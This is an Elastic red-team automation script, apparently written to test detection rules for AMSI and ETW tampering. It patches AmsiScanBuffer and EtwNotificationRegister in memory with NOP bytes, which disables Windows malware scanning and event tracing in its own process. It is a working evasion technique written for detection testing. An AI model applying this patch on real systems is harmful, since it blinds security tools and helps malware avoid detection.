# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata


metadata = RtaMetadata(
    uuid="395d0e4c-e7f5-4c77-add7-92b1d2ba169e",
    platforms=["windows"],
    siem=[],
    endpoint=[{"rule_id": "586bf106-b208-45fc-9401-727664175ca0", "rule_name": "Potential AMSI Bypass via Memory Patching"}, 
              {"rule_id": "3046168a-91cb-4ecd-a061-b75b1df1c107", "rule_name": "Potential Evasion via Event Tracing Patching"}],
    techniques=["T1562.001"],
)


@common.requires_os(*metadata.platforms)
def main():
    import ctypes, platform
    from ctypes import windll, wintypes

    kernel32 = windll.kernel32

    LoadLibraryA = kernel32.LoadLibraryA
    LoadLibraryA.argtypes = [wintypes.LPCSTR]
    LoadLibraryA.restype = wintypes.HMODULE

    GetProcAddress = kernel32.GetProcAddress
    GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
    GetProcAddress.restype = ctypes.c_void_p

    VirtualProtect = kernel32.VirtualProtect
    VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.PDWORD]
    VirtualProtect.restype = wintypes.BOOL

    GetCurrentProcess = kernel32.GetCurrentProcess
    GetCurrentProcess.restype = wintypes.HANDLE

    WriteProcessMemory = kernel32.WriteProcessMemory
    WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, ctypes.c_size_t, wintypes.LPVOID]
    WriteProcessMemory.restype = wintypes.BOOL

    GetModuleHandleA = kernel32.GetModuleHandleA
    GetModuleHandleA.restype = wintypes.HANDLE
    GetModuleHandleA.argtypes = [wintypes.LPCSTR]

    RWX = 0x40  # PAGE_READ_WRITE_EXECUTE
    OLD_PROTECTION = wintypes.LPDWORD(ctypes.c_ulong(0))

    if platform.architecture()[0] == '64bit':
        print(f'[+] using x64 based patch')
        patch = (ctypes.c_char * 6)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90)
    if platform.architecture()[0] != '64bit':
        print(f'[+] using x86 based patch')
        patch = (ctypes.c_char * 8)(0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90)

    lib = LoadLibraryA(b"amsi.dll")
    if lib:
        print(f'[+] Loaded amsi.dll at {hex(lib)}')

    amsi = GetProcAddress(lib, b"AmsiScanBuffer")
    etw = GetProcAddress(GetModuleHandleA(b"ntdll.dll"), b"EtwNotificationRegister")
    if amsi and etw:
        print(f'[+] Address of AmsiScanBuffer(): {hex(amsi)}')
        print(f'[+] Address of EtwEventWrite(): {hex(etw)}')

    amsi_rwx = VirtualProtect(amsi, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
    etw_rwx = VirtualProtect(etw, ctypes.sizeof(patch), RWX, OLD_PROTECTION)
    if amsi_rwx and etw_rwx:
        print(f'[+] Changed Proctection of AmsiScanBuffer and EtwNotificationRegister to RWX')

    c_null = ctypes.c_int(0)
    amsi_bypass = WriteProcessMemory(GetCurrentProcess(), amsi, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
    etw_bypass = WriteProcessMemory(GetCurrentProcess(), etw, patch, ctypes.sizeof(patch), ctypes.byref(c_null))
    if amsi_bypass and etw_bypass:
        print(f'[*] RTA Done - Patched AmsiScanBuffer & EtwNotificationRegister!')

if __name__ == "__main__":
    exit(main())
